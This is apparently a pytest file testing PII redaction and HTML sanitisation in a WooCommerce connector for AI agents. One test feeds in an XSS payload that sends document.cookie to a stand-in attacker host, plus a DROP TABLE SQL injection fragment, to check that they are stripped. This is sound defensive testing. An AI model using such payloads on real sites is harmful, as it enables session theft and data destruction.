"""
test_pii.py — PII redaction and untrusted-text sanitization tests.

Coverage:
  - PII_REDACT_FIELDS constant contains exactly the specified fields
  - PII redacted by default (email, phone, address_1, address_2, postcode, last_name)
  - City, state, and country are NOT redacted
  - PII visible when REDACT_PII disabled
  - _untrusted_fields key present in order and product responses
  - customer_note HTML is stripped (including injection-style strings)
  - Long notes are truncated
  - Sanitize empty/None returns None
"""

from __future__ import annotations

import pytest

from woocommerce_connector.models import (
    MAX_UNTRUSTED_LEN,
    PII_REDACT_FIELDS,
    order_from_raw,
    product_from_raw,
    sanitize_untrusted,
)

_REDACTED = "[redacted]"


# ---------------------------------------------------------------------------
# PII_REDACT_FIELDS constant
# ---------------------------------------------------------------------------

def test_pii_redact_fields_exact():
    """PII_REDACT_FIELDS must contain exactly the six specified fields."""
    expected = {"email", "phone", "address_1", "address_2", "postcode", "last_name"}
    assert set(PII_REDACT_FIELDS) == expected


# ---------------------------------------------------------------------------
# Redaction ON (default)
# ---------------------------------------------------------------------------

def test_order_pii_redacted_by_default(raw_order):
    result = order_from_raw(raw_order, redact_pii=True)
    billing = result["billing"]
    shipping = result["shipping"]

    for field in PII_REDACT_FIELDS:
        assert billing.get(field) == _REDACTED, (
            f"billing.{field} should be '{_REDACTED}', got {billing.get(field)!r}"
        )

    for field in PII_REDACT_FIELDS:
        if field in shipping:
            assert shipping.get(field) == _REDACTED, (
                f"shipping.{field} should be '{_REDACTED}', got {shipping.get(field)!r}"
            )


def test_city_state_country_not_redacted(raw_order):
    """Location fields must survive redaction so agents can answer location questions."""
    result = order_from_raw(raw_order, redact_pii=True)
    billing = result["billing"]
    assert billing["city"] == "Springfield"
    assert billing["state"] == "IL"
    assert billing["country"] == "US"

    shipping = result["shipping"]
    assert shipping["city"] == "Springfield"
    assert shipping["state"] == "IL"


def test_first_name_not_redacted(raw_order):
    """first_name is kept (only last_name is redacted)."""
    result = order_from_raw(raw_order, redact_pii=True)
    assert result["billing"]["first_name"] == "Alice"


# ---------------------------------------------------------------------------
# Redaction OFF
# ---------------------------------------------------------------------------

def test_order_pii_visible_when_disabled(raw_order):
    result = order_from_raw(raw_order, redact_pii=False)
    billing = result["billing"]
    assert billing["email"] == "alice@example.com"
    assert billing["phone"] == "555-1234"
    assert billing["last_name"] == "Smith"
    assert billing["address_1"] == "123 Main St"
    assert billing["address_2"] == "Apt 4"
    assert billing["postcode"] == "62701"


# ---------------------------------------------------------------------------
# _untrusted_fields labeling
# ---------------------------------------------------------------------------

def test_order_has_untrusted_fields_key(raw_order):
    result = order_from_raw(raw_order)
    assert "_untrusted_fields" in result
    assert "customer_note" in result["_untrusted_fields"]


def test_product_has_untrusted_fields_key(raw_product):
    result = product_from_raw(raw_product)
    assert "_untrusted_fields" in result
    assert "description_sanitized" in result["_untrusted_fields"]
    assert "short_description_sanitized" in result["_untrusted_fields"]


# ---------------------------------------------------------------------------
# Untrusted-text sanitization
# ---------------------------------------------------------------------------

def test_customer_note_html_stripped(raw_order):
    raw_order["customer_note"] = "<b>Bold note</b> — leave at door"
    result = order_from_raw(raw_order)
    note = result["customer_note"]
    assert note is not None
    assert "<b>" not in note
    assert "leave at door" in note


def test_customer_note_injection_string(raw_order):
    """Classic XSS / SQL injection in customer note must be sanitized."""
    injection = (
        "<img src=x onerror=fetch('https://evil.example.com?c='+"
        "document.cookie)> Deliver ASAP; DROP TABLE orders;--"
    )
    raw_order["customer_note"] = injection
    result = order_from_raw(raw_order)
    note = result["customer_note"]
    assert note is not None
    # HTML tags must be gone
    assert "<img" not in note
    assert "onerror" not in note
    # The plaintext part survives (modulo stripped chars)
    assert "Deliver ASAP" in note


def test_customer_note_script_tag_stripped(raw_order):
    """<script> and </script> tags must be stripped.

    Note: HTML stripping removes tags but preserves the inner text.
    The relevant guarantee is that the *tag itself* is gone so browsers
    cannot execute it.  The text content of the script block (e.g.
    `alert('xss')`) will remain as harmless plain text — agents read
    text, they do not execute it.
    """
    raw_order["customer_note"] = "<script>alert('xss')</script>Normal note"
    result = order_from_raw(raw_order)
    note = result["customer_note"]
    # Tags removed
    assert "<script>" not in note
    assert "</script>" not in note
    # Safe text preserved
    assert "Normal note" in note


def test_sanitize_untrusted_truncates_long_text():
    long_text = "X" * (MAX_UNTRUSTED_LEN + 200)
    result = sanitize_untrusted(long_text)
    assert result is not None
    # Length: MAX_UNTRUSTED_LEN chars + 1 ellipsis character
    assert len(result) == MAX_UNTRUSTED_LEN + 1
    assert result.endswith("\u2026")


def test_sanitize_untrusted_none_returns_none():
    assert sanitize_untrusted(None) is None


def test_sanitize_untrusted_empty_html_returns_none():
    assert sanitize_untrusted("<br>  <p></p>  ") is None


def test_sanitize_untrusted_short_text_unchanged():
    result = sanitize_untrusted("Hello, world!")
    assert result == "Hello, world!"


def test_product_description_html_stripped(raw_product):
    result = product_from_raw(raw_product)
    desc = result["description_sanitized"]
    assert desc is not None
    assert "<p>" not in desc
    assert "<strong>" not in desc
    assert "fancy" in desc.lower()
